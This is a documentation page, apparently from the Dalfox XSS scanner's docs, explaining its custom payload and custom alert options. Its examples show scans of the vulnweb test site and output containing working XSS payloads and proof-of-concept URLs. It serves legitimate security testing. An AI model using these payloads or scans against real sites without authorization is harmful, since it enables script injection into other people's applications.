---
title: Custom Payload and Custom Alert
redirect_from: /docs/custom-payload/
nav_order: 1
parent: Features
toc: true
layout: page
---

# Custom Payload and Custom Alert

This guide provides detailed instructions on how to use custom payloads and custom alerts with Dalfox. These features allow you to customize the payloads and alerts used during XSS scanning.

## Custom Payload

You can specify a custom payload file using the `--custom-payload` option. This file should contain a list of payloads to be used during the scan.

### Command

```bash
dalfox url --custom-payload payload-list.txt
```

## Custom Alert

You can customize the alert value and type used in the payloads with the `--custom-alert-value` and `--custom-alert-type` options.

### Options

- **`--custom-alert-value`**: The value to use in the alert (e.g., `XSS`, `1`, `document.location`).
- **`--custom-alert-type`**: The type of the alert value (e.g., `str`, `none`).

#### Alert Types

- **none or empty**: Use the alert value directly (e.g., `--custom-alert-value=130`, `--custom-alert-value=location.href`).
- **str**: Wrap the alert value in quotes (e.g., `"PAYLOAD"`, `'PAYLOAD'`).

### Examples

#### Default (No Options)

```bash
dalfox url http://testphp.vulnweb.com/listproducts.php?artist=123
```

Output:

```
[V] Triggered XSS Payload (found DOM Object): cat=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>
    48 line:  syntax to use near '=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>' at line 1
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%3C%2FScriPt%3E%3CsCripT+class%3Ddalfox%3Ealert%281%29%3C%2FsCriPt%3E
```

#### Custom Alert Value

```bash
dalfox url http://testphp.vulnweb.com/listproducts.php?artist=123 --custom-alert-value 1337
```

Output:

```
[V] Triggered XSS Payload (found DOM Object): cat='><sVg/onload=alert(1337) class=dalfox>
    48 line:  syntax to use near ''><sVg/onload=alert(1337) class=dalfox>' at line 1
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%27%3E%3CsVg%2Fonload%3Dalert%281337%29+class%3Ddalfox%3E
```

#### Custom Alert Value with Type `str`

```bash
dalfox url http://testphp.vulnweb.com/listproducts.php?artist=123 --custom-alert-value 1337 --custom-alert-type str
```

Output:

```
[V] Triggered XSS Payload (found DOM Object): cat=<svG/onload=confirm("1337") class=dalfox>
    48 line:  syntax to use near '=<svG/onload=confirm("1337") class=dalfox>' at line 1
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%3CsvG%2Fonload%3Dconfirm%28%221337%22%29+class%3Ddalfox%3E
```

#### Custom Alert Value with Multiple Types

```bash
dalfox url http://testphp.vulnweb.com/listproducts.php?artist=123 --custom-alert-value 1337 --custom-alert-type str,int
```

Output:

```
[V] Triggered XSS Payload (found DOM Object): cat="><iFrAme/src=jaVascRipt:alert('1337') class=dalfox></iFramE>
    48 line:  syntax to use near '"><iFrAme/src=jaVascRipt:alert('1337') class=dalfox></iFramE
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%28%271337%27%29+class%3Ddalfox%3E%3C%2FiFramE%3E
```
